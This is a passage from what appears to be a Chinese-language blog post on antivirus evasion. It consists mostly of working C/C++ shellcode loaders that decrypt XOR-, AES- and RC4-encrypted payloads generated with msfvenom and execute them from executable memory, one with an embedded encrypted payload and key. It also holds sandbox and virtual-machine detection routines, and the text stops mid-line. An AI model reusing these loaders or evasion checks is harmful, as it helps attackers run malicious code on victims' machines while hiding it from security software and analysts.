href=\"https://blog.f-secure.com/hiding-malicious-code-with-module-stomping/\">Hiding malicious code with “Module Stomping”: Part 1 - F-Secure Blog</a></p>\n<p><a href=\"https://blog.omroot.io/process-code-injection-through-undocumented-ntapis/\">Process Code Injection Through Undocumented NTAPI (omroot.io)</a></p>\n<h1 id=\"shellcode的混淆加密\"><a href=\"#shellcode的混淆加密\" class=\"headerlink\" title=\"shellcode的混淆加密\"></a>shellcode的混淆加密</h1><p>针对shellcode不同的加密方式</p>\n<h2 id=\"XOR\"><a href=\"#XOR\" class=\"headerlink\" title=\"XOR\"></a>XOR</h2><p>shellcode生成</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">msfvenom -p windows&#x2F;x64&#x2F;exec cmd&#x3D;&quot;calc.exe&quot; --encrypt xor -f c -o shellcode.c --encrypt-key test</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">#include &lt;Windows.h&gt;</span><br><span class=\"line\">#include &lt;stdio.h&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">unsigned char encshellcode[] &#x3D; &quot;xor shellcode is here&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">int main() &#123;</span><br><span class=\"line\">    int buflen &#x3D; sizeof encshellcode;</span><br><span class=\"line\">    char key[] &#x3D; &quot;test&quot;;</span><br><span class=\"line\">    unsigned char shellcode[sizeof encshellcode];</span><br><span class=\"line\"></span><br><span class=\"line\">    &#x2F;&#x2F; XOR 解密</span><br><span class=\"line\">    int j &#x3D; 0;</span><br><span class=\"line\">    for (int i &#x3D; 0; i &lt; sizeof encshellcode; i++) &#123;</span><br><span class=\"line\">        if (j &#x3D;&#x3D; sizeof key - 1) j &#x3D; 0;</span><br><span class=\"line\">        shellcode[i] &#x3D; encshellcode[i] ^ key[j];</span><br><span class=\"line\">        j++;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    for (int i &#x3D; 0; i &lt; sizeof shellcode; i++) &#123;</span><br><span class=\"line\">        printf(&quot;\\\\x%02x&quot;, shellcode[i]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    void* exec &#x3D; VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class=\"line\">    memcpy(exec, shellcode, sizeof shellcode);</span><br><span class=\"line\">    ((void(*)())exec)();</span><br><span class=\"line\">    return 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>tips：使用 InterlockedXor 进行平替异或符号，<a href=\"https://saucer-man.com/operation_and_maintenance/465.html#cl-1\">加载混淆的shellcode实现静态免杀</a></p>\n<h2 id=\"AES\"><a href=\"#AES\" class=\"headerlink\" title=\"AES\"></a>AES</h2><p>导入aes模块：<a href=\"https://github.com/xf555er/ShellcodeEncryption/tree/master/aes%E5%8A%A0%E5%AF%86\">ShellcodeEncryption/aes加密 </a></p>\n<p>项目结构如下</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/bypassav/image-20240410231219455.png\" alt=\"image-20240410231219455\"></p>\n<p>tools.h</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">#include &quot;AES.h&quot;</span><br><span class=\"line\">#include &quot;Base64.h&quot;</span><br><span class=\"line\">#include &lt;iostream&gt;</span><br><span class=\"line\">#include &lt;random&gt;</span><br><span class=\"line\">#include &lt;sstream&gt;</span><br><span class=\"line\">#include &lt;iomanip&gt;</span><br><span class=\"line\">#include &lt;Windows.h&gt;</span><br><span class=\"line\">#include &lt;tchar.h&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">string EncryptionAES(const string&amp; strSrc, const char* g_key, const char* g_iv);</span><br><span class=\"line\"></span><br><span class=\"line\">string DecryptionAES(const string&amp; strSrc, const char* g_key, const char* g_iv);</span><br><span class=\"line\"></span><br><span class=\"line\">string random_string(size_t length);</span><br><span class=\"line\"></span><br><span class=\"line\">string toHexString(unsigned char* data, size_t len);</span><br></pre></td></tr></table></figure>\n\n<p>tools.cpp</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">#include &quot;tools.h&quot;</span><br><span class=\"line\">#define BUF_SIZE 4096</span><br><span class=\"line\"></span><br><span class=\"line\">using namespace std;</span><br><span class=\"line\"></span><br><span class=\"line\">string EncryptionAES(const string&amp; strSrc, const char* g_key, const char* g_iv) &#123;</span><br><span class=\"line\">\tsize_t length &#x3D; strSrc.length();</span><br><span class=\"line\">\tint block_num &#x3D; length &#x2F; BLOCK_SIZE + 1;</span><br><span class=\"line\">\t&#x2F;&#x2F;明文</span><br><span class=\"line\">\tchar* szDataIn &#x3D; new char[block_num * BLOCK_SIZE + 1];</span><br><span class=\"line\">\tmemset(szDataIn, 0x00, block_num * BLOCK_SIZE + 1);</span><br><span class=\"line\">\tstrcpy(szDataIn, strSrc.c_str());</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#x2F;&#x2F;进行PKCS7Padding填充。</span><br><span class=\"line\">\tint k &#x3D; length % BLOCK_SIZE;</span><br><span class=\"line\">\tint j &#x3D; length &#x2F; BLOCK_SIZE;</span><br><span class=\"line\">\tint padding &#x3D; BLOCK_SIZE - k;</span><br><span class=\"line\">\tfor (int i &#x3D; 0; i &lt; padding; i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tszDataIn[j * BLOCK_SIZE + k + i] &#x3D; padding;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tszDataIn[block_num * BLOCK_SIZE] &#x3D; &#39;\\0&#39;;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#x2F;&#x2F;加密后的密文</span><br><span class=\"line\">\tchar* szDataOut &#x3D; new char[block_num * BLOCK_SIZE + 1];</span><br><span class=\"line\">\tmemset(szDataOut, 0, block_num * BLOCK_SIZE + 1);</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#x2F;&#x2F;进行进行AES的CBC模式加密</span><br><span class=\"line\">\tAES aes;</span><br><span class=\"line\">\taes.MakeKey(g_key, g_iv, 16, 16);</span><br><span class=\"line\">\taes.Encrypt(szDataIn, szDataOut, block_num * BLOCK_SIZE, AES::CBC);</span><br><span class=\"line\">\tstring str &#x3D; base64_encode((unsigned char*)szDataOut,</span><br><span class=\"line\">\t\tblock_num * BLOCK_SIZE);</span><br><span class=\"line\">\tdelete[] szDataIn;</span><br><span class=\"line\">\tdelete[] szDataOut;</span><br><span class=\"line\">\treturn str;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">string DecryptionAES(const string&amp; strSrc, const char* g_key, const char* g_iv) &#123;</span><br><span class=\"line\">\tstring strData &#x3D; base64_decode(strSrc);</span><br><span class=\"line\">\tsize_t length &#x3D; strData.length();</span><br><span class=\"line\">\t&#x2F;&#x2F;密文</span><br><span class=\"line\">\tchar* szDataIn &#x3D; new char[length + 1];</span><br><span class=\"line\">\tmemcpy(szDataIn, strData.c_str(), length + 1);</span><br><span class=\"line\">\t&#x2F;&#x2F;明文</span><br><span class=\"line\">\tchar* szDataOut &#x3D; new char[length + 1];</span><br><span class=\"line\">\tmemcpy(szDataOut, strData.c_str(), length + 1);</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#x2F;&#x2F;进行AES的CBC模式解密</span><br><span class=\"line\">\tAES aes;</span><br><span class=\"line\">\taes.MakeKey(g_key, g_iv, 16, 16);</span><br><span class=\"line\">\taes.Decrypt(szDataIn, szDataOut, length, AES::CBC);</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#x2F;&#x2F;去PKCS7Padding填充</span><br><span class=\"line\">\tif (0x00 &lt; szDataOut[length - 1] &lt;&#x3D; 0x16)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tint tmp &#x3D; szDataOut[length - 1];</span><br><span class=\"line\">\t\tfor (int i &#x3D; length - 1; i &gt;&#x3D; length - tmp; i--)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tif (szDataOut[i] !&#x3D; tmp)</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\tmemset(szDataOut, 0, length);</span><br><span class=\"line\">\t\t\t\tcout &lt;&lt; &quot;去填充失败！解密出错！！&quot; &lt;&lt; endl;</span><br><span class=\"line\">\t\t\t\tbreak;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t\telse</span><br><span class=\"line\">\t\t\t\tszDataOut[i] &#x3D; 0;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tstring strDest(szDataOut);</span><br><span class=\"line\">\tdelete[] szDataIn;</span><br><span class=\"line\">\tdelete[] szDataOut;</span><br><span class=\"line\">\treturn strDest;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">string random_string(size_t length)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tauto randchar &#x3D; []() -&gt; char</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tconst char charset[] &#x3D;</span><br><span class=\"line\">\t\t\t\t&quot;0123456789&quot;</span><br><span class=\"line\">\t\t\t\t&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span><br><span class=\"line\">\t\t\t\t&quot;abcdefghijklmnopqrstuvwxyz&quot;</span><br><span class=\"line\">\t\t\t\t&quot;!@#$%^&amp;*()_+&#x3D;-[]&#123;&#125;;:,.&lt;&gt;&#x2F;?|&quot;;</span><br><span class=\"line\">\t\t\tconst size_t max_index &#x3D; (sizeof(charset) - 1);</span><br><span class=\"line\">\t\t\treturn charset[rand() % max_index];</span><br><span class=\"line\">\t\t&#125;;</span><br><span class=\"line\">\tstring str(length, 0);</span><br><span class=\"line\">\tgenerate_n(str.begin(), length, randchar);</span><br><span class=\"line\">\treturn str;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">string toHexString(unsigned char* data, size_t len)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tostringstream oss;</span><br><span class=\"line\">\tfor (size_t i &#x3D; 0; i &lt; len; ++i)</span><br><span class=\"line\">\t\toss &lt;&lt; hex &lt;&lt; setw(2) &lt;&lt; setfill(&#39;0&#39;) &lt;&lt; static_cast&lt;int&gt;(data[i]);</span><br><span class=\"line\">\treturn oss.str();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>shellcode_enc.cpp 用于生成key与iv，并将shellcode加密</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">#include &lt;iostream&gt;</span><br><span class=\"line\">#include &quot;tools.h&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">using namespace std;</span><br><span class=\"line\"></span><br><span class=\"line\">int main() &#123;</span><br><span class=\"line\">\tunsigned char buf[] &#x3D; &quot;shellcode is here&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#x2F;&#x2F;生成随机16位的key值和iv值</span><br><span class=\"line\">\tsrand(time(0)); &#x2F;&#x2F; initialize random seed</span><br><span class=\"line\">\tstring g_key &#x3D; random_string(16);</span><br><span class=\"line\">\tstring g_iv &#x3D; random_string(16);</span><br><span class=\"line\">\tcout &lt;&lt; &quot;[+]key值: &quot; &lt;&lt; g_key &lt;&lt; endl;</span><br><span class=\"line\">\tcout &lt;&lt; &quot;[+]iv值: &quot; &lt;&lt; g_iv &lt;&lt; endl;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#x2F;&#x2F;将shellcode字节数组转换成十六进制字符串</span><br><span class=\"line\">\tsize_t bufLen &#x3D; sizeof(buf) &#x2F; sizeof(unsigned char) - 1;</span><br><span class=\"line\">\tstring OriginalShellcode &#x3D; toHexString(buf, bufLen);</span><br><span class=\"line\">\tcout &lt;&lt; &quot;[+]未加密的shellcode: &quot; &lt;&lt; OriginalShellcode &lt;&lt; endl;</span><br><span class=\"line\">\t&#x2F;&#x2F;对shellcode字符串进行加密</span><br><span class=\"line\">\tstring EncryptShellcode &#x3D; EncryptionAES(OriginalShellcode, g_key.c_str(), g_iv.c_str());</span><br><span class=\"line\">\tcout &lt;&lt; &quot;[+]加密后的shellcode: &quot; &lt;&lt; EncryptShellcode &lt;&lt; endl;</span><br><span class=\"line\">\t&#x2F;&#x2F;对加密后的shellcode字符串进行解密</span><br><span class=\"line\">\tstring DecryptShellcode &#x3D; DecryptionAES(EncryptShellcode, g_key.c_str(), g_iv.c_str());</span><br><span class=\"line\">\tcout &lt;&lt; &quot;[+]解密后的shellcode: &quot; &lt;&lt; DecryptShellcode &lt;&lt; endl;</span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/bypassav/image-20240410231122463.png\" alt=\"image-20240410231122463\"></p>\n<p>然后在main.cpp中进行解密与加载shellcode</p>\n<p>main.cpp</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">#include &lt;Windows.h&gt;</span><br><span class=\"line\">#include &lt;stdio.h&gt;</span><br><span class=\"line\">#include &quot;AES.h&quot;</span><br><span class=\"line\">#include &quot;Base64.h&quot;</span><br><span class=\"line\">#include &quot;tools.h&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">using namespace std;</span><br><span class=\"line\"></span><br><span class=\"line\">int main() &#123;</span><br><span class=\"line\">    char g_key[17] &#x3D; &quot;o+aMJ3dY7Wy&amp;v&lt;Me&quot;;   &#x2F;&#x2F;填写key密钥</span><br><span class=\"line\">    char g_iv[17] &#x3D; &quot;cz-ax@RDj].62&#123;c;&quot;;  &#x2F;&#x2F;定义iv向量</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#x2F;&#x2F; 加密后的shellcode</span><br><span class=\"line\">\tstring buf &#x3D; &quot;HBqjD&#x2F;JxIjs7hoFY+ujH2xb&#x2F;7c9oOoHrxhRH84xVGjBV+Na0IdYACn4kPVd2Rnmb3Jk9Uxpsr8diLtRodIVWJOS1&#x2F;qG0DG+YvNvc1sqhxNjRadalgWbDcIYhKVO8EGBM+5Sfluez&#x2F;acKdyQjeRScESS9RyUxRgcd5Z1OOHDqmrTLKgXLsYxyFMRRD+Mq25LFMEzOxfUglIqi8OR74p4FMVf3Oinx2SxOfkglfQkcXvkUUdMfMb5nIhPv7IuPxJApPbF7zs8g&#x2F;kbN6NgcI0CpCIxWu8epxAeRC2gqhgzCkV50iZDPzFXK5q+PP9STOdgzDI&#x2F;xBnw2TmQGwnJIFgFbWZ69IpFImH5Lq3qniDzpQlV2wS0Q29tOR37rg+xLdyO5P2VVdEGOummQVjTQBKRJ9tfme69kHuvPSvXMMtvH1UHfTy9fdDpnPqCYWAbp0wz1W34yZZpX0gJA1HRzTxR0Jo176UOY4EoqxLL5rLie1e1b198b0gWMi3FUosTHMP+1aGx2WJZONE8EVSFfGP8lEa3anQSx&#x2F;J1ZrZheltCXJ6VKUMTUIA&#x2F;yMT+2hIBcMUgG&#x2F;W9wYgv9xWYFLryxqHVSD45bDlTewwQjI6uI1xLau8VP2abmJQLbJt4BxlEr1pCdzZl+slhpDkT8lOD&#x2F;u82&#x2F;rMymdedmgMVJMnOG8B9cdK4ilzY9dR1jQGZS4PVwg0gvZbPz7pVlLpHfj5qnD4c3k5BdcvFS+Z+XbCLE5+R7AuU&#x3D;&quot;;</span><br><span class=\"line\">\t&#x2F;&#x2F; 解密shellcode</span><br><span class=\"line\">\tstring strbuf &#x3D; DecryptionAES(buf, g_key, g_iv);</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t&#x2F;&#x2F;将解密的shellcode放到shellcode数组中</span><br><span class=\"line\">\tchar* p &#x3D; (char*)strbuf.c_str();</span><br><span class=\"line\">\tunsigned char* shellcode &#x3D; (unsigned char*)calloc(strbuf.length() &#x2F; 2, sizeof(unsigned char));</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t&#x2F;&#x2F; 两字节的输入到shellcode地址中，所以长度为一半</span><br><span class=\"line\">\tfor (size_t i &#x3D; 0; i &lt; strbuf.length() &#x2F; 2; i++) &#123;</span><br><span class=\"line\">\t\tsscanf(p, &quot;%02x&quot;, &amp;shellcode[i]);</span><br><span class=\"line\">\t\tp +&#x3D; 2;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#x2F;&#x2F;输出shellcode数组里的内容</span><br><span class=\"line\">\tint ShellcodeSize &#x3D; strbuf.length() &#x2F; 2;</span><br><span class=\"line\"></span><br><span class=\"line\">\tprintf(&quot;[+]Decrypted buffer:\\n&quot;);</span><br><span class=\"line\">\tfor (int i &#x3D; 0; i &lt; ShellcodeSize; i++) &#123;</span><br><span class=\"line\">\t\tprintf(&quot;\\\\x%02x&quot;, shellcode[i]);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tchar *Memory;</span><br><span class=\"line\">\tMemory &#x3D; (char *)VirtualAlloc(NULL, sizeof(ShellcodeSize), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class=\"line\">\t&#x2F;&#x2F;memcpy(Memory, shellcode, sizeof(ShellcodeSize));</span><br><span class=\"line\">\tRtlMoveMemory(Memory, shellcode, ShellcodeSize);</span><br><span class=\"line\">\t((void(*)())Memory)();</span><br><span class=\"line\"></span><br><span class=\"line\">    return 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"rc4\"><a href=\"#rc4\" class=\"headerlink\" title=\"rc4\"></a>rc4</h2><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">#include &lt;Windows.h&gt;</span><br><span class=\"line\">#include &lt;stdio.h&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">using namespace std;</span><br><span class=\"line\"></span><br><span class=\"line\">#define size_b 256</span><br><span class=\"line\">unsigned char sbox[257] &#x3D; &#123; 0 &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F;初始化s表</span><br><span class=\"line\">void init_sbox(unsigned char* key) &#123;</span><br><span class=\"line\">    unsigned int i, j, k;</span><br><span class=\"line\">    int tmp;</span><br><span class=\"line\">    for (i &#x3D; 0; i &lt; size_b; i++) &#123;</span><br><span class=\"line\">        sbox[i] &#x3D; i;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    j &#x3D; k &#x3D; 0;</span><br><span class=\"line\">    for (i &#x3D; 0; i &lt; size_b; i++) &#123;</span><br><span class=\"line\">        tmp &#x3D; sbox[i];</span><br><span class=\"line\">        j &#x3D; (j + tmp + key[k]) % size_b;</span><br><span class=\"line\">        sbox[i] &#x3D; sbox[j];</span><br><span class=\"line\">        sbox[j] &#x3D; tmp;</span><br><span class=\"line\">        if (++k &gt;&#x3D; strlen((char*)key))k &#x3D; 0;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F;加解密函数</span><br><span class=\"line\">void enc_dec(unsigned char* key, unsigned char* data) &#123;</span><br><span class=\"line\">    int i, j, k, R, tmp;</span><br><span class=\"line\">    init_sbox(key);</span><br><span class=\"line\"></span><br><span class=\"line\">    j &#x3D; k &#x3D; 0;</span><br><span class=\"line\">    for (i &#x3D; 0; i &lt; strlen((char*)data); i++) &#123;</span><br><span class=\"line\">        j &#x3D; (j + 1) % size_b;</span><br><span class=\"line\">        k &#x3D; (k + sbox[j]) % size_b;</span><br><span class=\"line\"></span><br><span class=\"line\">        tmp &#x3D; sbox[j];</span><br><span class=\"line\">        sbox[j] &#x3D; sbox[k];</span><br><span class=\"line\">        sbox[k] &#x3D; tmp;</span><br><span class=\"line\"></span><br><span class=\"line\">        R &#x3D; sbox[(sbox[j] + sbox[k]) % size_b];</span><br><span class=\"line\"></span><br><span class=\"line\">        data[i] ^&#x3D; R;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">int main() &#123;</span><br><span class=\"line\">\tunsigned char buf[] &#x3D; &quot;shellcode is here&quot;;</span><br><span class=\"line\">\tunsigned char key[] &#x3D; &quot;hacker_hack&quot;;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t&#x2F;&#x2F; 加密</span><br><span class=\"line\">\tenc_dec(key,buf);</span><br><span class=\"line\">\tprintf(&quot;[+]加密: &quot;);</span><br><span class=\"line\">\tfor (size_t i &#x3D; 0; i &lt; sizeof(buf); i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tprintf(&quot;\\\\x%02x&quot;, buf[i]);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t&#x2F;&#x2F; 解密</span><br><span class=\"line\">\tenc_dec(key, buf);</span><br><span class=\"line\">\tprintf(&quot;\\n[+]解密: &quot;);</span><br><span class=\"line\">\tfor (size_t i &#x3D; 0; i &lt; sizeof(buf); i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tprintf(&quot;\\\\x%02x&quot;, buf[i]);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tLPVOID pMemory &#x3D; VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class=\"line\">\tRtlMoveMemory(pMemory, buf, sizeof(buf));</span><br><span class=\"line\">\tHANDLE hThread &#x3D; CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pMemory, NULL, 0, NULL);</span><br><span class=\"line\">\tWaitForSingleObject(hThread, INFINITE);</span><br><span class=\"line\">\tVirtualFree(pMemory, 0, MEM_RELEASE);</span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"反调试-沙箱-虚拟机\"><a href=\"#反调试-沙箱-虚拟机\" class=\"headerlink\" title=\"反调试/沙箱/虚拟机\"></a>反调试/沙箱/虚拟机</h1><p><a href=\"https://github.com/ZanderChang/anti-sandbox/tree/master\">Windows对抗沙箱和虚拟机的方法总结</a></p>\n<p><a href=\"https://mp.weixin.qq.com/s/mBOfkXm-irfpNZ5PoIOe_w\">https://mp.weixin.qq.com/s/mBOfkXm-irfpNZ5PoIOe_w</a></p>\n<p><a href=\"https://zhuanlan.zhihu.com/p/628376104\">虚拟机检测技术整理</a></p>\n<h2 id=\"沙箱\"><a href=\"#沙箱\" class=\"headerlink\" title=\"沙箱\"></a>沙箱</h2><p>开机时间，temp文件数量，cpu数量，物理内存大小，硬盘大小，进程，注册表，usb连接记录，样本名称，微信/Google程序，命名管道通信，延时执行，加速检测</p>\n<p>开机时间</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">void GetUpTime()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    DWORD iRunTime &#x3D; GetTickCount();</span><br><span class=\"line\">    DWORD TestTime &#x3D; 1800000; &#x2F;&#x2F; 半个小时开机时间</span><br><span class=\"line\">    if (iRunTime &gt; TestTime) printf(&quot;[+]not vm\\n&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">    const int Num1 &#x3D; 1000;</span><br><span class=\"line\">    const int Num2 &#x3D; 1900;</span><br><span class=\"line\">    time_t nowTime;</span><br><span class=\"line\">    time(&amp;nowTime);</span><br><span class=\"line\">    time_t systemUpTime &#x3D; nowTime - (iRunTime &#x2F; Num1);</span><br><span class=\"line\">    struct tm* timeInfo;</span><br><span class=\"line\">    timeInfo &#x3D; localtime(&amp;systemUpTime);</span><br><span class=\"line\">    printf(&quot;开机的时间: %d-%d-%d %02d:%02d:%02d&quot;, timeInfo-&gt;tm_year + Num2,</span><br><span class=\"line\">        timeInfo-&gt;tm_mon + 1, timeInfo-&gt;tm_mday, timeInfo-&gt;tm_hour,</span><br><span class=\"line\">        timeInfo-&gt;tm_min, timeInfo-&gt;tm_sec);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>cpu数量，这里获取的是逻辑核数量</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">void GetCpu()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    SYSTEM_INFO sysinfo;</span><br><span class=\"line\">    GetSystemInfo(&amp;sysinfo);</span><br><span class=\"line\">    DWORD cpunumber &#x3D; sysinfo.dwNumberOfProcessors;</span><br><span class=\"line\">    DWORD cpumask &#x3D; sysinfo.dwActiveProcessorMask;</span><br><span class=\"line\">    if (cpunumber &gt;&#x3D; 4) printf(&quot;[+]not vm\\n&quot;); &#x2F;&#x2F; 4个逻辑内核</span><br><span class=\"line\"></span><br><span class=\"line\">    cout &lt;&lt; &quot;[+]cpunumber &quot; &lt;&lt; cpunumber &lt;&lt; endl;</span><br><span class=\"line\">    cout &lt;&lt; &quot;[+]cpumask &quot; &lt;&lt; cpumask &lt;&lt; endl;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>物理内存大小</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">void GetRam()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    MEMORYSTATUSEX meminfo;</span><br><span class=\"line\">    meminfo.dwLength &#x3D; sizeof(meminfo);</span><br><span class=\"line\">    GlobalMemoryStatusEx(&amp;meminfo);</span><br><span class=\"line\">    DWORDLONG raminfo &#x3D; meminfo.ullTotalPhys &#x2F; 1024 &#x2F; 1024;</span><br><span class=\"line\">    if (raminfo &gt; 3072) printf(&quot;[+]not vm\\n&quot;); &#x2F;&#x2F; ram大于3G &#x3D; 1024 * 3</span><br><span class=\"line\"></span><br><span class=\"line\">    cout &lt;&lt; &quot;[+]ramsize &quot; &lt;&lt; raminfo &lt;&lt; endl;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>硬盘大小，需要管理员权限</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">void GetDisk()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    HANDLE hDrive;</span><br><span class=\"line\">    GET_LENGTH_INFORMATION size;</span><br><span class=\"line\">    DWORD lpBytes;</span><br><span class=\"line\">    </span><br><span class=\"line\">    hDrive &#x3D; CreateFileA(&quot;\\\\\\\\.\\\\PhysicalDrive0&quot;, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);</span><br><span class=\"line\">    if (hDrive &#x3D;&#x3D; INVALID_HANDLE_VALUE)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        CloseHandle(hDrive);</span><br><span class=\"line\">        cout &lt;&lt; &quot;[+]无法打开该磁盘&quot; &lt;&lt; endl;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    DeviceIoControl(hDrive, IOCTL_DISK_GET_LENGTH_INFO, NULL, 0, &amp;size, sizeof(GET_LENGTH_INFORMATION), &amp;lpBytes, NULL);</span><br><span class=\"line\">    CloseHandle(hDrive);</span><br><span class=\"line\">    LONGLONG disksize &#x3D; size.Length.QuadPart &#x2F; 1073741824;</span><br><span class=\"line\">    if (disksize &gt; 100) printf(&quot;[+]not vm\\n&quot;);   &#x2F;&#x2F; 大于 100G</span><br><span class=\"line\"></span><br><span class=\"line\">    cout &lt;&lt; &quot;[+]disksize &quot; &lt;&lt; disksize &lt;&lt; &quot;G&quot; &lt;&lt; endl;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>样本名称，有的沙箱会重命名样本</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">void GetFilename()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    char currentProcessPath[MAX_PATH + 1];</span><br><span class=\"line\">    GetModuleFileName(NULL, currentProcessPath, 200);</span><br><span class=\"line\">    if (strstr(currentProcessPath, &quot;shellcode.exe&quot;)) printf(&quot;[+]not vm\\n&quot;);  &#x2F;&#x2F; 没有重名</span><br><span class=\"line\"></span><br><span class=\"line\">    cout &lt;&lt; &quot;[+]filename &quot; &lt;&lt; currentProcessPath &lt;&lt; endl;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>usb连接记录  <code>\\HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Enum\\USBSTOR</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">void GetUsb()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    HKEY hKey;</span><br><span class=\"line\">    DWORD mountedUSBDevicesCount;</span><br><span class=\"line\">    RegOpenKeyEx(HKEY_LOCAL_MACHINE, &quot;SYSTEM\\\\\\\\ControlSet001\\\\\\\\Enum\\\\\\\\USBSTOR&quot;, 0, KEY_READ, &amp;hKey);</span><br><span class=\"line\">    RegQueryInfoKey(hKey, NULL, NULL, NULL, &amp;mountedUSBDevicesCount, NULL, NULL, NULL, NULL, NULL, NULL, NULL);</span><br><span class=\"line\">    if (mountedUSBDevicesCount &gt; 1) printf(&quot;[+]not vm\\n&quot;);  &#x2F;&#x2F; usb大于1</span><br><span class=\"line\"></span><br><span class=\"line\">    cout &lt;&lt; &quot;[+]usb &quot; &lt;&lt; mountedUSBDevicesCount &lt;&lt; endl;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>加速检测</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">#include 